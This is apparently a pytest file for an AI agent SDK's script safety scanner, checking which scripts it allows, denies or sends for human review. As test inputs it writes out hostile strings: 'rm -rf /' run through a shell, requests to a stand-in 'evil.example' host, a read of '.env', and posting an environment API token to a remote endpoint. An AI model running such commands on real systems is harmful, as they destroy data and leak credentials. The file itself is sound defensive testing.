from pathlib import Path

from trpc_agent_sdk.tools.safety import Decision
from trpc_agent_sdk.tools.safety import ToolScriptSafetyScanner

SAMPLES = Path("examples/tool_safety/samples")


def scan_sample(name: str):
    scanner = ToolScriptSafetyScanner()
    return scanner.scan_file(str(SAMPLES / name))


def test_python_sample_decisions():
    expected = {
        "safe_python.py": Decision.ALLOW,
        "read_env.py": Decision.DENY,
        "read_ssh_key.py": Decision.DENY,
        "credential_file_key.py": Decision.DENY,
        "network_non_whitelist.py": Decision.DENY,
        "network_whitelist.py": Decision.ALLOW,
        "subprocess_call.py": Decision.NEEDS_HUMAN_REVIEW,
        "shell_injection.py": Decision.NEEDS_HUMAN_REVIEW,
        "infinite_loop.py": Decision.NEEDS_HUMAN_REVIEW,
        "sensitive_output.py": Decision.DENY,
        "dynamic_url_review.py": Decision.NEEDS_HUMAN_REVIEW,
        "eval_review.py": Decision.NEEDS_HUMAN_REVIEW,
    }
    for name, decision in expected.items():
        assert scan_sample(name).decision == decision


def test_alias_import_detection():
    script = "import requests as r\nr.get('https://evil.example/x')"
    report = ToolScriptSafetyScanner().scan_script(script, "python")
    assert report.decision == Decision.DENY
    assert "PY_NETWORK_NON_WHITELIST" in {finding.rule_id for finding in report.findings}


def test_constant_url_propagation():
    script = "import requests\nurl = 'https://api.example.com/status'\nrequests.get(url)"
    assert ToolScriptSafetyScanner().scan_script(script, "python").decision == Decision.ALLOW


def test_subprocess_string_delegates_to_bash_scanner():
    script = "import subprocess\nsubprocess.run('rm -rf /', shell=True)"
    report = ToolScriptSafetyScanner().scan_script(script, "python")
    assert report.decision == Decision.DENY
    assert "BASH_DANGEROUS_RM_RF" in {finding.rule_id for finding in report.findings}


def test_shell_true_dynamic_review():
    script = "import subprocess\nsubprocess.run(user_cmd, shell=True)"
    report = ToolScriptSafetyScanner().scan_script(script, "python")
    assert report.decision == Decision.NEEDS_HUMAN_REVIEW
    assert "PY_SHELL_TRUE_DYNAMIC" in {finding.rule_id for finding in report.findings}


def test_private_key_literal_redaction():
    secret = "dont_show_this_secret_value"
    script = f'key = """-----BEGIN PRIVATE KEY-----\n{secret}\n-----END PRIVATE KEY-----"""'
    report = ToolScriptSafetyScanner().scan_script(script, "python")
    assert report.decision == Decision.DENY
    assert secret not in str(report.to_dict())


def test_sensitive_output_detection():
    report = ToolScriptSafetyScanner().scan_script("api_key = 'secret'\nprint(api_key)", "python")
    assert report.decision == Decision.DENY
    assert "PY_SENSITIVE_OUTPUT" in {finding.rule_id for finding in report.findings}


def test_sensitive_taint_from_os_getenv_to_network_data():
    script = (
        "import os\n"
        "import requests\n"
        "value = os.getenv('API_TOKEN')\n"
        "requests.post('https://api.example.com/collect', data=value)\n"
    )
    report = ToolScriptSafetyScanner().scan_script(script, "python")
    assert report.decision == Decision.DENY
    assert "PY_SENSITIVE_OUTPUT" in {finding.rule_id for finding in report.findings}


def test_dynamic_delete_review():
    script = "import shutil\ntarget = input('path: ')\nshutil.rmtree(target)"
    report = ToolScriptSafetyScanner().scan_script(script, "python")
    assert report.decision == Decision.NEEDS_HUMAN_REVIEW
    assert "PY_DYNAMIC_DELETE_REVIEW" in {finding.rule_id for finding in report.findings}


def test_socket_create_connection_literal_host_deny():
    script = "import socket\nsocket.create_connection(('evil.example', 443))"
    report = ToolScriptSafetyScanner().scan_script(script, "python")
    assert report.decision == Decision.DENY
    assert "PY_SOCKET_NON_WHITELIST" in {finding.rule_id for finding in report.findings}


def test_command_args_python_c_scanned_as_python():
    report = ToolScriptSafetyScanner().scan_script(
        "python",
        "bash",
        command_args=["-c", "open('.env').read()"],
    )
    assert report.decision == Decision.DENY
    assert "PY_SENSITIVE_FILE_READ" in {finding.rule_id for finding in report.findings}


def test_command_args_python3_c_scanned_as_python():
    report = ToolScriptSafetyScanner().scan_script(
        "python3",
        "bash",
        command_args=["-c", "import requests; requests.get('https://evil.example/x')"],
    )
    assert report.decision == Decision.DENY
    assert "PY_NETWORK_NON_WHITELIST" in {finding.rule_id for finding in report.findings}


def test_python_while_one_loop_review():
    report = ToolScriptSafetyScanner().scan_script("while 1:\n    pass", "python")
    assert report.decision == Decision.NEEDS_HUMAN_REVIEW
    assert "PY_INFINITE_LOOP" in {finding.rule_id for finding in report.findings}


def test_python_large_allocation_review():
    report = ToolScriptSafetyScanner().scan_script("data = bytearray(1024 * 1024 * 1024)", "python")
    assert report.decision == Decision.NEEDS_HUMAN_REVIEW
    assert "PY_LARGE_ALLOCATION_REVIEW" in {finding.rule_id for finding in report.findings}
